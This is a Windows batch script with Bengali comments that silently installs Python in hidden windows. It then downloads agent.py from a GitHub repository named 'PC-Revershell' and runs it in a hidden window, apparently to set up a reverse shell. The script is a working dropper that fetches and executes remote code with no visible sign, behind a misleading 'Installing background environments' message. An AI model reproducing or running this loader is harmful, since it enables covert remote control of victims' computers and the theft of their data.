@echo off
setlocal enabledelayedexpansion

:: ১. পাইথন ইনস্টলড আছে কিনা তা চেক করা
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [+] Python not found. Installing background environments...
    
    cd %temp%
    
    :: পাইথন ইনস্টলার ডাউনলোড করা
    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe', 'python_install.exe')"
    
    :: সাইলেন্ট ইনস্টল করা (InstallAllUsers=1 দেওয়ার কারণে এটি Program Files-এ যাবে)
    start /wait "" python_install.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    del python_install.exe
)

:: ২. পাইথনের সরাসরি পাথ নিশ্চিত করা (পাথ এরর এড়ানোর জন্য)
set "PYTHON_CMD=python"
if exist "C:\Program Files\Python310\python.exe" (
    set "PYTHON_CMD=C:\Program Files\Python310\python.exe"
) else if exist "%ProgramFiles(x86)%\Python310\python.exe" (
    set "PYTHON_CMD=%ProgramFiles(x86)%\Python310\python.exe"
)

:: ৩. গিটহাব থেকে কোডটি ডাউনলোড করে সরাসরি রান করা (মেমোরি ও পাথ সেফ মেথড)
powershell -WindowStyle Hidden -Command "$code = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mdarif76769/PC-Revershell/main/agent.py'); Start-Process '%PYTHON_CMD%' -ArgumentList '-c', $code -WindowStyle Hidden"

exit
